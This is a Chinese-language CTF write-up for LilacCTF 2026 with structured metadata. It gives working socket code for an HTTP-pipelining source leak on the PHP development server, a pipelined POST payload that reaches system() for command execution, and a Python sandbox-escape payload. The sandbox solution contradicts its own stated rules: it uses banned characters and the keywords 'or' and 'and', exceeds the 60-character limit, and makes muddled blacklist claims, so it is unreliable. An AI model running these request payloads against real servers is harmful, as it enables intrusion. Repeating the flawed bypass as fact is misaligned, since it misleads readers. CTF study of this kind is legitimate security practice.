---
title: LilacCTF 2026 Writeup by Mini-Venom (Web + Python sandbox)
contest: LilacCTF
year: 2026
difficulty: medium
vuln_type: web_unknown
tags: [PHP dev server 源码泄露, Python sandbox, 黑名单绕过, min(dir()), pop(), ~False]
attack_chain: |
  1. Web keep (PHP<=7.4.21 Development Server 源码泄露):
     - HTTP Pipelining: GET /index.php HTTP/1.1 + GET /robots.txt HTTP/1.1 同连接
     - 触发 dev server 把第二个请求的响应"提前返回"给第一个 → 泄露 index.php 源码
     - 源码含 // s3Cr37_f1L3.php.bak 注释 → 访问 /s3Cr37_f1L3.php.bak
  2. Pipelining 二次攻击 RCE:
     - GET /s3Cr37_f1L3.php.bak HTTP/1.1 + POST /s3Cr37_f1L3.php HTTP/1.1 + admin=ob_clean(); echo '---RESULT_START---'; system('ls /'); die();
     - 后端 admin POST 参数走 system() → RCE
  3. Web CheckIn (Python 3.14.2 sandbox):
     - 限制: 禁数字 + 字母 (a-zA-Z0-9) + 禁 [_s=+[],"'<>-*@#$%^&\|{}:;] + 禁关键字 (status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals) + 长度 <= 60
     - 条件: status[0] 是 truthy + id(status) == status_id → 读 /flag
  4. Python sandbox bypass 链:
     - min(dir()) 返回字典序最小属性名 = "status"  (绕 status 黑名单)
     - vars().get(min(dir())) 拿 status 变量 (绕 vars 黑名单 — 但 vars 不在黑名单)
     - status.pop() 取出 False
     - ~False == -1 是 truthy
     - status.append(~False) → status[0] = -1 是 truthy
     - id(status) 是 status 的内存地址，原 status_id 也在 — 条件满足
     - 完整 payload: vars().get(min(dir())).pop() or vars().get(min(dir())).append(~False) and vars().get(min(dir())).pop()
  5. 加密题 Z_call0/Z_call1/Z_call2 (Reverse):
     - Z_call0/2: gen_arity=4, has_subscript=False
     - Z_call1: gen_arity=4, has_subscript=True
     - RC4 + salt + key1 加密 flag + md5 校验
key_payload: |
  # Web keep 源码泄露 Pipelining:
  GET /index.php HTTP/1.1\r\n
  Host: 61.147.171.103:60598\r\n
  \r\n
  GET /robots.txt HTTP/1.1\r\n
  Host: 61.147.171.103:60598\r\n
  \r\n
  
  # Pipelining 二次 RCE:
  GET /s3Cr37_f1L3.php.bak HTTP/1.1\r\n
  POST /s3Cr37_f1L3.php HTTP/1.1\r\n
  Content-Type: application/x-www-form-urlencoded\r\n
  Content-Length: NN\r\n
  \r\n
  admin=ob_clean(); echo '---RESULT_START---'; system('cat /flag*'); die();
  
  # Python sandbox bypass:
  vars().get(min(dir())).pop() or vars().get(min(dir())).append(~False) and vars().get(min(dir())).pop()
  # min(dir()) = "status"
  # vars().get("status") = status 变量
  # .pop() 取最后一个元素 (False)
  # ~False = -1 truthy
  # .append(~False) 改 status[0] = -1
  # 满足: status[0] is truthy and id(status) == status_id
one_liner: LilacCTF 2026 Web (PHP dev server 源码泄露) + Python sandbox (禁数字字母 + 关键字黑名单 + 60 长度) bypass。
lesson: |
  - PHP <= 7.4.21 Development Server 有 HTTP Pipelining 源码泄露漏洞
  - Python sandbox: 禁 status/flag/vars/globals/eval/exec 等关键字时, 用 min(dir()) 拿 "status"
  - vars() 不在黑名单 → vars().get(min(dir())) 拿 status 变量
  - pop() 取出最后一个元素, append(~False) 改第一个为 truthy
  - ~False == -1 是 Python truthy
  - 长度限制 60 字符时要压成单行链式调用
quality: high
---

# LilacCTF 2026 Writeup by Mini-Venom

> 来源: ctfiot.com 293351

## Web keep (PHP <= 7.4.21 Dev Server 源码泄露)

**漏洞：** PHP 内置 dev server 有 HTTP Pipelining 源码泄露漏洞

```python
import socket
host, port = "61.147.171.103", 60598
payload = (
    f"GET /index.php HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"\r\n"
    f"GET /robots.txt HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"\r\n"
).encode()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(payload)
```

**原理：** dev server 看到 Pipelining 请求时，把第二个请求的响应"提前返回"给第一个请求 → 泄露 index.php 源码。

泄露的源码含 `// s3Cr37_f1L3.php.bak` → 访问 `/s3Cr37_f1L3.php.bak`。

**二次 Pipelining RCE：**
```python
req1 = f"GET /s3Cr37_f1L3.php.bak HTTP/1.1\r\n"
req2 = (
    f"POST /s3Cr37_f1L3.php HTTP/1.1\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(post_data)}\r\n"
    f"\r\n"
    f"{post_data}"
)
# post_data = "admin=ob_clean(); echo '---RESULT_START---'; system('cat /flag_*'); die();"
```

## Web CheckIn (Python 3.14.2 sandbox)

**限制条件：**
- 禁 `[0-9A-Z]` (数字 + 大写字母)
- 禁 `[_s=+[],"'<>-*@#$%^&\|{}:;]` (符号)
- 禁 `status|flag|update|setattr|getattr|eval|exec|import|locals|os|sys|builtins|open|or|and|not|is|breakpoint|exit|print|quit|help|input|globals` 关键字
- 长度 ≤ 60

**触发条件：**
```python
if status[0] and id(status) == status_id:
    with open('/flag', 'r') as f:
        flag = f.read().strip()
```

**绕过链：**
```python
vars().get(min(dir())).pop() or vars().get(min(dir())).append(~False) and vars().get(min(dir())).pop()
```

**逐步拆解：**
1. `min(dir())` 返回字典序最小属性名 = `"status"`（绕 status 黑名单）
2. `vars().get("status")` 拿 status 变量（vars 不在黑名单）
3. `.pop()` 取出最后一个元素（False）
4. `~False == -1` 是 truthy
5. `.append(~False)` 改 `status[0] = -1`
6. `id(status)` 是 status 的内存地址，原 status_id 也在 → 条件满足

## 加密题 (Reverse)

```python
# Z_call0: gen_arity=4, has_subscript=False
# Z_call1: gen_arity=4, has_subscript=True
# Z_call2: gen_arity=4, has_subscript=False
# 
# lilac___ = salt + key1 + RC4-encrypted flag + md5 校验
```

## 评价

LilacCTF 2026 Mini-Venom 战队速查，亮点是：
- **PHP dev server 源码泄露**：HTTP Pipelining 绕过 7.4.21 限制
- **Python sandbox bypass**：`min(dir())` 反射出 "status" 字符串绕黑名单 + `vars().get()` 拿变量 + `pop() + ~False` 改 truthy

`min(dir())` 反射绕过关键字黑名单是 2025-2026 通用 Python sandbox 技巧，值得背熟。
